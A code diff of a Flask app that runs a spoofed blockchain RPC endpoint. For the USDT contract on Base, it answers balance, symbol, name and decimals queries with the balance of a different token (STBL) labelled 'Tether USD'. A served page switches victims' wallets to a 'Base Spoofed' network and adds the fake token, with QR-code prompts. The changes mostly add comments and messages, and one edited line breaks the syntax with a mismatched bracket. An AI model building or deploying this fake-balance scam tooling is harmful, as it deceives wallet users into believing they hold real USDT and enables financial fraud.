@@ -6,7 +6,7 @@ from web3 import Web3
 app = Flask(__name__)
 
 SPOOFED_USDT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  # Real Base USDT
-REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"  # Correct STBL
+REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"  # STBL contract
 BASE_RPC = "https://mainnet.base.org"
 w3 = Web3(Web3.HTTPProvider(BASE_RPC))
 
@@ -48,7 +48,7 @@ def handle_rpc():
 
             function_signature = data_field[:10]
 
-            if function_signature == "0x70a08231":
+            if function_signature == "0x70a08231":  # balanceOf
                 try:
                     address = Web3.to_checksum_address("0x" + data_field[34:74])
                     real_balance = stbl_contract.functions.balanceOf(address).call()
@@ -61,11 +61,11 @@ def handle_rpc():
                     result = "0x" + hex(0)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-            elif function_signature == "0x313ce567":
+            elif function_signature == "0x313ce567":  # decimals
                 result = "0x" + hex(6)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-            elif function_signature == "0x95d89b41":
+            elif function_signature == "0x95d89b41":  # symbol
                 symbol = "USDT"
                 length = len(symbol)
                 length_hex = hex(32)[2:].zfill(64)
@@ -74,7 +74,7 @@ def handle_rpc():
                 result = "0x" + length_hex + str_length_hex + str_hex
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-            elif function_signature == "0x06fdde03":
+            elif function_signature == "0x06fdde03":  # name
                 name = "Tether USD"
                 length = len(name)
                 length_hex = hex(32)[2:].zfill(64)
@@ -83,11 +83,11 @@ def handle_rpc():
                 result = "0x" + length_hex + str_length_hex + str_hex
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-            elif function_signature == "0x18160ddd":
+            elif function_signature == "0x18160ddd":  # totalSupply
                 result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
-    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
+    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"))
     return jsonify(response.json())
 
 @app.route('/add')
@@ -222,7 +222,7 @@ def add_token():
                     return;
                 }
                 try {
-                    // Switch to Base Spoofed first
+                    // Switch to Base Spoofed to ensure RPC is used
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x2105' }]
@@ -240,9 +240,12 @@ def add_token():
                             }
                         }
                     });
-                    status.textContent = 'Token added successfully! Refresh your wallet if needed.';
+                    status.textContent = 'Token added! Switch to Base Spoofed and refresh if not visible.';
                 } catch (error) {
                     status.textContent = 'Failed: ' + error.message;
+                    if (error.code === 4902) {
+                        status.textContent += ' (Network not found - please scan QR again)';
+                    }
                 }
             };
         </script>
